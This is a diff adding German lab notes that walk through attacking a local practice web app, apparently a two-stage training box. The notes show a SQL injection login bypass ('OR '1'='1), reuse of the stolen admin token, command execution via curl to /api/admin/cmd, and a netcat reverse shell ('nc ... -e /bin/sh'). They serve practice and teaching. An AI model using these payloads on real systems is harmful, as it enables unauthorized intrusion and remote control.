@@ -1,0 +1,55 @@
+1. Discovery (es wird kali linux empfohlen [Nutzung von SQL-Map, gobuster, burp-suit, nmap]):
+	- basic nmap scan to discover ports
+	- dir enumeration mit gobuster --url "http:****" --wordists /usr/share/wordlists/seclists/Discovery/Web-Content
+	  DirBuster-2007_directory-list-lowercase-2.3-small.txt
+	 (seclists ist nicht vorinstalliert, aber installierbar unter linux mit sudo apt instal seclists)
+	 
+	 -> /login ist verfügbar 
+1.2 Discovery:
+	- Wir schmeißen Burp-Suit im proxy mode an um eine Analyse für das login verfahren zu machen.
+	-> {username: "", password: ""}
+	-> api Endpunkt gefunden unter /api/*||login
+	- Eunmeration vom api endpunkt mit gobsuter
+	-> /api/admin && /api/admin/cmd
+2. preparation:
+	- /api/admin , /api/admin/cmd und /api/login scheinen interassant zu sein
+	-> /api/admin scheint ein priv check zu sein
+	-> /api/admin/cmd => admin privs werden benötigt
+	-> /api/login 
+	
+	- Jetzt wo wir die API enpoints gefunden haben gucken wir ob das Loginfenster durch eine SQL-Injection angreifbar ist mit: '
+	- Wir bekommen einen Internal server error. Das ist ein gutes zeichen, dass der Service exploitable ist.
+3. exploiation:
+	- wir können nun das abgefangene package modifizieren um eine sql injection zu provozieren:
+	->	
+		{
+		 "username": "admin",
+		 "password": "'OR '1'='1"
+		 }
+		 Die Query sieht vermutlich so aus:
+		SELECT * FROM users WHERE {username} AND {password}
+	
+	=> wir bekommen zurück, dass wie nun admin privs haben
+3.5 explitation:
+	Nach der SQL-Injection haben wir nun einen auth_token cookie mit admins privs bekommen. den können wir nutzten um eine POST request
+	mit curl zu senden (wir nutzen erstmal einen "harmlosen" befehl um die Lücke zu testen):
+	->
+		curl -X POST http://localhost:7401/api/admin/cmd \
+		-H "Content-Type: application/json" \
+		-d '{"cmd": "ls"}' \
+		-b 'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzgxMzc0NTMsImV4cCI6MT			c3ODE0MTA1M30.BlcuBnnCdnTa6tQucYaXlAnzeEUOMvf4Nm0BtqMyflw'
+
+	Wir bekommen eine Antwort zurück:
+	{"stdout":"node_modules\npackage.json\npackage-	 lock.json\nsrc\n","stderr":""}                                                                                                                      
+
+	Wie wir sehen funktioniert der Exploit. Jetzt können wir eine reverse shell mit netCat starten um einen Foothold zu securen.
+	Also starten wir einen listener mit "nc -lnvp 4444" und senden die payload
+	curl -X POST http://localhost:7401/api/admin/cmd \
+-H "Content-Type: application/json" \
+-d '{"cmd": "nc 127.0.0.1 4444 -e /bin/sh"}' \
+-b 'auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzgxMzc0NTMsImV4cCI6MTc3ODE0MTA1M30.BlcuBnnCdnTa6tQucYaXlAnzeEUOMvf4Nm0BtqMyflw'
+{"stdout":"","stderr":""}   
+
+Und siehe da wir haben eine reverse shell und unsern Initial access. Da das aber 
+eine two-stage pwn-Box ist geht es jetzt an die Privileges Escalation und lateral movement :hype:
+	
